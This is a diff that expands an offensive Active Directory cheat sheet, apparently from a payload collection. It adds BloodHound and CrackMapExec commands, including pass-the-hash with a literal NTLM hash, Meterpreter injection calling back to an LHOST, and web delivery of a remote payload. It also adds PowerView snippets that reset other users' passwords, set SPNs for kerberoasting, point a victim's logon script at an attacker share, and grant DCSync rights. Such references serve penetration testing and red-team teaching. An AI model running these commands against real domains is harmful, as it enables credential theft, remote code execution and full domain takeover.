@@ -46,6 +46,9 @@
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
+      - [GenericAll](#genericall)
+      - [GenericWrite](#genericwrite)
+      - [WriteDACL](#writedacl)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
     - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
@@ -71,38 +74,50 @@
 * [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 
   ```powershell
-  apt install bloodhound #kali
-  neo4j console
+  # start BloodHound and the database
+  root@payload$ apt install bloodhound #kali
+  root@payload$ neo4j console
+  root@payload$ ./bloodhound
   Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
-  ./bloodhound
-  SharpHound.exe (from resources/Ingestor)
-  SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
-  SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
-  SharpHound.exe -c all -d active.htb -SearchForest
-  SharpHound.exe --EncryptZip --ZipFilename export.zip
-  or 
+  
+  # run the ingestor on the machine using SharpHound.exe
+  # https://github.com/BloodHoundAD/SharpHound3
+  .\SharpHound.exe (from resources/Ingestor)
+  .\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
+  .\SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
+  .\SharpHound.exe -c all -d active.htb -SearchForest
+  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
+  .\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
+
+  # or run the ingestor on the machine using Powershell
+  # https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors
   Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
-  or 
+  Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
+
+  # or remotely via BloodHound Python
+  # https://github.com/fox-it/BloodHound.py
   bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
   ```
 
 * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 
-  ```bash
-  apt-get install -y libssl-dev libffi-dev python-dev build-essential
-  git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
-  crackmapexec smb -L
-  crackmapexec smb -M name_module -o VAR=DATA
-  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
-  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
-  crackmapexec 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
-  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
-  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
-  crackmapexec 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
-  crackmapexec 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
-  crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
-  crackmapexec mimikatz --server http --server-port 80
+  ```powershell
+  # use the latest release, CME is now a binary packaged will all its dependencies
+  root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
+
+  # execute cme (smb, winrm, mssql, ...)
+  root@payload$ cme smb -L
+  root@payload$ cme smb -M name_module -o VAR=DATA
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
+  root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
+  root@payload$ cme mimikatz --server http --server-port 80
   ```
 
 * [Mitm6](https://github.com/fox-it/mitm6.git)
@@ -1026,22 +1041,57 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
 
 ### Abusing Active Directory ACLs/ACEs
 
-* **GenericAll on User** : We can reset user's password without knowing the current password
-* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : `net group "domain admins" spotless /add /domain`
-* **WriteProperty on Group** : We can again add ourselves to the Domain Admins group and escalate privileges: `net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain`
-* **Self (Self-Membership) on Group** : Another privilege that enables the attacker adding themselves to a group
-* **ForceChangePassword** : we can reset the user's password without knowing their current password: `$c = Get-Credential;Set-DomainUserPassword -Identity changeme -AccountPassword $c.Password -Verbose` 
-* **GenericWrite on User** : WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
-* **WriteDACL** : It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'`
-    ```powershell
-    # give DCSync right to titi
-    Add-ObjectACL -TargetDistinguishedName "dc=dev,dc=testlab,dc=local" -PrincipalSamAccountName titi -Rights DCSync
-    ```
-
 Check ACL for an User with [ADACLScanner](https://github.com/canix1/ADACLScanner).
 
 ```powershell
 ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
+```
+
+#### GenericAll
+
+* **GenericAll on User** : We can reset user's password without knowing the current password
+* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : `net group "domain admins" spotless /add /domain`
+
+GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its hash and kerberoast it.
+
+```powershell
+# using PowerView
+# Check for interesting permissions on accounts:
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
+ 
+# Check if current user has already an SPN setted:
+Get-DomainUser -Identity <UserName> | select serviceprincipalname
+ 
+# Force set the SPN on the account:
+Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
+```
+
+#### GenericWrite
+
+* Reset another user's password
+
+    ```powershell
+    # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
+    $user = 'DOMAIN\user1'; 
+    $pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
+    $creds = New-Object System.Management.Automation.PSCredential $user, $pass;
+    $newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
+    Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
+    ```
+
+* WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
+
+
+#### WriteDACL
+
+To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'`
+
+```powershell
+# Give DCSync right to the principal identity
+Import-Module .\PowerView.ps1
+$SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
 ```
 
 
@@ -1572,3 +1622,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
 * [Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf](https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0)
 * [Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+* [Active-Directory-Exploitation-Cheat-Sheet - @buftas](https://github.com/buftas/Active-Directory-Exploitation-Cheat-Sheet#local-privilege-escalation)
